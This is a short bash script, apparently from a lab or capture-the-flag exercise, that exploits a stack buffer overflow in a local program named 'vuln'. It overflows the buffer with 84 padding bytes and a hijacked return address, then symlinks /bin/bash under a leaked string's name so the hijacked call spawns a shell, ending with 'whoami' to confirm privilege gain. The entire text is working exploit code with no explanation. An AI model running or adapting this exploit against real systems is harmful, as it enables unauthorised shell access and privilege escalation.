#!/bin/bash2
export PATH=$PATH:.
export sysaddr=$(./getaddr)
export hexaddr=$(echo -n "$sysaddr" | tac -rs .. | sed 's/../\\x&/g')
./vuln $(perl -e "printf 'A'x84 . \"$hexaddr\"") 2> arg
export arghex=$(xxd arg)
#issue
export argspl=$(echo "$arghex" | sed -n 's/.*3a20\(.*\)3a20.*/\1/p')
export result=$(echo $argspl | sed 's/ //g' | sed 's/../\\x&/g')
ln -s /bin/bash `perl -e "printf \"$result\""`
./vuln $(perl -e "printf 'A'x84 . \"$hexaddr\"")
whoami